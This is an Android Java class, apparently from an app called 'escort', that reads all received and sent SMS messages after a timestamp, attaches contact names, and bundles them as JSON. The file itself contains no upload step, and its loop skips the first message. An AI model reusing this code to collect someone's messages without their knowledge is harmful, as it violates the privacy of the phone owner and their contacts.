package sumon.com.escort;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MobileSMS {

    private Context context;
    private String TAG = MobileSMS.class.getSimpleName();
    private String smsType[] = {"Received", "Sent"};
    private SimpleDateFormat simpleDateFormat;
    private JSONArray smsArray;
    private JSONObject smsObj;
    private long lastUpdatedTime;

    MobileSMS(Context context, long lastUpdatedTime){
        this.context = context;
        smsArray = new JSONArray();
        smsObj = new JSONObject();
        this.lastUpdatedTime = lastUpdatedTime;
        simpleDateFormat = new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss_a", Locale.getDefault());
    }

    public JSONObject getSMS(){

        String type = "";
        String uriString = "";

        for(int i = 0; i < smsType.length; i++){
            if(smsType[i].equalsIgnoreCase("Received")){
                type = "Received";
                uriString = "content://sms/inbox";
            }else{
                type = "Sent";
                uriString = "content://sms/sent";
            }

            readSMS(type, uriString);
        }

        try {
            smsObj.put("SMS", smsArray);
        } catch (JSONException e){
            e.printStackTrace();
        }

        return smsObj;
    }

    public void readSMS(String type, String uriString){

        try {
            Uri uri = Uri.parse(uriString);
            ContentResolver contentResolver = context.getContentResolver();
            Cursor cursor = contentResolver.query(uri, null, null, null,"date asc");
            cursor.moveToFirst();

            while (cursor.moveToNext()) {

                long dateTimeMillis = cursor.getLong(cursor.getColumnIndex("date"));

                if(dateTimeMillis > lastUpdatedTime){
                    Date date = new Date(dateTimeMillis);
                    String smsDate = simpleDateFormat.format(date);

                    String message = cursor.getString(cursor.getColumnIndex("body"));
                    String number = cursor.getString(cursor.getColumnIndex("address"));
                    String name = getContactNameByNumber(number);

                    JSONObject smsData = new JSONObject();
                    smsData.put("type", type);
                    smsData.put("date", smsDate);
                    smsData.put("name", name);
                    smsData.put("number", number);
                    smsData.put("message", message);

                    smsArray.put(smsData);
                }
            }

            cursor.close();

        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public String getContactNameByNumber(String number) {

        String name = " ";
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
        ContentResolver contentResolver = context.getContentResolver();
        Cursor contactLookup = contentResolver.query(uri, null, null, null, null);

        try {
            if (contactLookup != null && contactLookup.getCount() > 0) {
                contactLookup.moveToNext();
                name = contactLookup.getString(contactLookup.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (contactLookup != null) {
                contactLookup.close();
            }
        }

        return name;
    }

}
